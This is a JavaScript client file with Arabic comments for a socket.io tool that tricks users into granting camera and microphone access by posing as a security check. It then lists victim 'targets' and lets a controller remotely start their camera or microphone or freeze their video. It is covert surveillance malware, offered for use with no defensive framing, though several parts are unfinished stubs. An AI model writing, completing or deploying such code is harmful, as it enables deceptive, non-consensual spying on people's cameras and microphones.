const socket = io();
let localStream;
let remoteStream;
let selectedTargetId = null;

// إعداد واجهة المستخدم
const localVideo = document.getElementById('localVideo');
const remoteVideo = document.getElementById('remoteVideo');
const targetsList = document.getElementById('targets-list');

// 1. طلب صلاحيات الكاميرا والميكروفون (عن طريق الخداع البصري كأنه فحص أمان)
async function requestMediaPermissions() {
    try {
        localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        localVideo.srcObject = localStream;
        console.log('[+] تم الحصول على الصلاحيات.');
    } catch (err) {
        console.error('[-] رفض المستخدم الوصول:', err);
    }
}

// 2. إرسال الأوامر للهدف المحدد
function sendCommand(action, params = {}) {
    if (!selectedTargetId) {
        alert('⚠️ الرجاء اختيار هدف من القائمة أولاً.');
        return;
    }
    socket.emit('command', { targetId: selectedTargetId, action: action, params: params });
    console.log(`[→] إرسال أمر "${action}" إلى ${selectedTargetId}`);
}

// 3. استقبال الأوامر إذا كان هذا الجهاز هو "الهدف"
socket.on('execute', (payload) => {
    console.log('[←] استقبال أمر:', payload);
    switch (payload.action) {
        case 'start_cam':
            // هنا يتم بث الكاميرا للمتحكم (WebRTC Peer Connection)
            startWebRTC();
            break;
        case 'start_mic':
            // تفعيل الميكروفون
            break;
        case 'freeze':
            // تجميد الفيديو
            localStream.getVideoTracks()[0].enabled = false;
            break;
        // ... بقية الأوامر
    }
});

// 4. البوت الذكي (تحليل الصوت والصورة)
async function initBotBrain() {
    // استخدام TensorFlow.js لتحليل تعابير الوجه أو الأصوات
    // مثال: التعرف على الإيماءات للتحكم في الواجهة
    console.log('[AI] Bot brain online...');
}

// ربط الأزرار
document.getElementById('btn-start-cam').onclick = () => sendCommand('start_cam');
document.getElementById('btn-start-mic').onclick = () => sendCommand('start_mic');
document.getElementById('btn-freeze').onclick = () => sendCommand('freeze');

// تحديث قائمة الأهداف
socket.on('update_targets', (targets) => {
    targetsList.innerHTML = '';
    targets.forEach(t => {
        const li = document.createElement('li');
        li.textContent = `${t.deviceName} (${t.id})`;
        li.onclick = () => {
            selectedTargetId = t.id;
            document.querySelectorAll('#targets-list li').forEach(el => el.classList.remove('active'));
            li.classList.add('active');
        };
        targetsList.appendChild(li);
    });
});

// بدء التشغيل
requestMediaPermissions();
initBotBrain();
